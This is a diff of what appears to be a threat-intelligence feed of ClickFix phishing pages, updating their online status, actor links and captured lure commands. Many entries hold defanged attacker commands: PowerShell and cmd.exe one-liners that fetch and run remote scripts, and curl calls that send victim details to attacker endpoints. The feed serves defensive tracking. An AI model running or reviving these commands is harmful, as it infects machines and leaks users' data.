@@ -1830,11 +1830,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://172.104.186.13/",
    "brand": null,
    "product": null,
@@ -1848,7 +1848,7 @@
    "hosts": [
     {
      "host": "172.104.186.13",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     }
@@ -37284,11 +37284,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-03",
-   "last_online": null,
-   "offline_since": "2026-11-02",
+   "last_online": "2026-11-03",
+   "offline_since": null,
    "url": "http://bildplustext.de/",
    "brand": null,
    "product": null,
@@ -37310,16 +37310,22 @@
    "hosts": [
     {
      "host": "bildplustext.de",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     }
    ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [],
-   "connects_to": [],
-   "lure_from": []
+   "actor": "dprk",
+   "actor_link": "linked",
+   "commands": [
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+   ],
+   "connects_to": [
+    "fingerprint-veri.info"
+   ],
+   "lure_from": [
+    "ncheck-brows.beer"
+   ]
   },
   {
    "indicator": "bildungskonzern5d.gmbh",
@@ -50170,11 +50176,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-28",
-   "last_online": "2026-10-31",
-   "offline_since": "2026-11-01",
+   "last_online": "2026-11-03",
+   "offline_since": null,
    "url": "http://casadeescola.com.br/",
    "brand": null,
    "product": null,
@@ -50196,7 +50202,7 @@
    "hosts": [
     {
      "host": "casadeescola.com.br",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -50205,15 +50211,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=5a7c12c4-8d0e-4e02-9bde-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A56.080Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A56.080Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=1ce41476-bd9b-4a8f-8e28-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A33%3A08.603Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A33%3A08.603Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=100d73bb-5ce9-440a-9dbf-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A15.866Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A15.866Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5a7c12c4-8d0e-4e02-9bde-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcasadeescola.com.br%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A56.080Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A56.080Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -134392,10 +134398,10 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
-    "id-verfied.boats",
     "netweblabs.com",
     "pluginyardware.com",
-    "thumbinfo.net"
+    "thumbinfo.net",
+    "id-verfied.boats"
    ]
   },
   {
@@ -134504,11 +134510,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-01",
-   "last_online": "2026-11-01",
-   "offline_since": "2026-11-01",
+   "last_online": "2026-11-03",
+   "offline_since": null,
    "url": "https://keymessage.so/",
    "brand": "Meta",
    "product": "Instagram",
@@ -134530,7 +134536,7 @@
    "hosts": [
     {
      "host": "keymessage.so",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -134538,8 +134544,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=5f658b11-99d5-405a-a577-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T00%3A06%3A18.519Z\"\" -d \"\"lastShellAt=2026-11-01T00%3A06%3A18.519Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=05a4222b-0d1d-4ae3-805b-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A37.352Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A37.352Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5f658b11-99d5-405a-a577-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fkeymessage.so%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T00%3A06%3A18.519Z\"\" -d \"\"lastShellAt=2026-11-01T00%3A06%3A18.519Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -143425,11 +143432,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-28",
-   "last_online": "2026-10-31",
-   "offline_since": "2026-11-01",
+   "last_online": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.liftingbarriers.org/",
    "brand": null,
    "product": null,
@@ -143451,7 +143458,7 @@
    "hosts": [
     {
      "host": "www.liftingbarriers.org",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -143460,8 +143467,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=0a15e03f-99c5-4ad7-8bfe-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A59.691Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A59.691Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=ce772b83-7fc6-4c7d-8a97-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A33%3A07.069Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A33%3A07.069Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=f17e78f6-9584-4385-8f43-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A16.535Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A16.535Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=0a15e03f-99c5-4ad7-8bfe-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.liftingbarriers.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A59.691Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A59.691Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -173273,16 +173280,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
-    "groverudder12.com",
     "trek-72.com",
-    "hagosuro.lc"
+    "groverudder12.com",
+    "hagosuro.lc",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -174926,11 +174934,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-28",
-   "last_online": "2026-10-31",
-   "offline_since": "2026-11-01",
+   "last_online": "2026-11-03",
+   "offline_since": null,
    "url": "https://perucio.com/",
    "brand": null,
    "product": null,
@@ -174952,7 +174960,7 @@
    "hosts": [
     {
      "host": "perucio.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -174961,15 +174969,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=3fb96e7c-777f-4b1c-a50e-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A50.996Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A50.996Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=2eda16bb-d9e7-468d-91be-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T17%3A50%3A15.269Z\"\" -d \"\"lastShellAt=2026-10-29T17%3A50%3A15.269Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=d7acf74d-fd62-4c17-93e6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A30%3A54.446Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A30%3A54.446Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=3fb96e7c-777f-4b1c-a50e-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fperucio.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A50.996Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A50.996Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -176837,16 +176845,18 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4461|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4461|iex</span>"
+    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0e37|iex",
+    "<span style=\"white-space:pre\">irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=0e37|iex</span>",
+    "irm hxxps[:]//verifyidentrob01[.]cc/cdn/sync/traffic?r=4461|iex"
    ],
    "connects_to": [
+    "ubbrobccheck20.cc",
     "verifyidentrob01.cc"
    ],
    "lure_from": [
     "btorsercoyt31.cc",
     "zurggoyttjof21.cc",
-    "ubbrobccheck20.cc"
+    "checkogosdfg33.cc"
    ]
   },
   {
@@ -183885,6 +183895,7 @@
     "thu-ipad-03.cfd",
     "nikogdatakonebilo.cc",
     "efreitorher.org",
+    "yaebalciganovvjopu.org",
     "yaebaltakuyusety.com",
     "ciganshina.org",
     "pakistanskimalchik.org"
@@ -188428,8 +188439,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=ec205bda-742e-4096-83a1-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Frestrodesign.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A16%3A27.062Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A16%3A27.062Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=4dc17865-a7fa-4f69-a108-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Frestrodesign.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A07%3A04.235Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A07%3A04.235Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=ec205bda-742e-4096-83a1-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Frestrodesign.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A16%3A27.062Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A16%3A27.062Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -197980,8 +197992,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=044485ae-e524-4b05-bf03-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.sax4track.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A17%3A19.049Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A17%3A19.049Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=73ba515d-86e1-46f6-b962-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.sax4track.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A33%3A05.555Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A33%3A05.555Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=044485ae-e524-4b05-bf03-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.sax4track.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A17%3A19.049Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A17%3A19.049Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -207821,11 +207834,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-28",
    "last_seen": "2026-10-28",
-   "last_online": "2026-10-31",
-   "offline_since": "2026-11-01",
+   "last_online": "2026-11-03",
+   "offline_since": null,
    "url": "https://smartgadgetsrus.com/",
    "brand": null,
    "product": null,
@@ -207847,7 +207860,7 @@
    "hosts": [
     {
      "host": "smartgadgetsrus.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -207856,15 +207869,15 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=b476392d-591f-4a9c-a6b2-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A51.579Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A51.579Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=4eb07775-a713-4bae-93e6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-29T18%3A32%3A39.316Z\"\" -d \"\"lastShellAt=2026-10-29T18%3A32%3A39.316Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=2b8b4937-a816-4314-8c64-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A31%3A05.625Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A31%3A05.625Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=b476392d-591f-4a9c-a6b2-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsmartgadgetsrus.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-10-31T00%3A29%3A51.579Z\"\" -d \"\"lastShellAt=2026-10-31T00%3A29%3A51.579Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -209315,8 +209328,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=f2030fc7-d580-4e40-8f20-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsolutias.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A17%3A40.602Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A17%3A40.602Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit"
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=21e118b3-5307-41fa-a069-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsolutias.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-03T15%3A33%3A16.870Z\"\" -d \"\"lastShellAt=2026-11-03T15%3A33%3A16.870Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
+    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=f2030fc7-d580-4e40-8f20-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fsolutias.se%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-01T16%3A17%3A40.602Z\"\" -d \"\"lastShellAt=2026-11-01T16%3A17%3A40.602Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -226065,7 +226079,7 @@
    "status": "online",
    "first_seen": "2026-10-17",
    "last_seen": "2026-10-19",
-   "last_online": "2026-11-02",
+   "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://thesignmakeraz.com/",
    "brand": null,
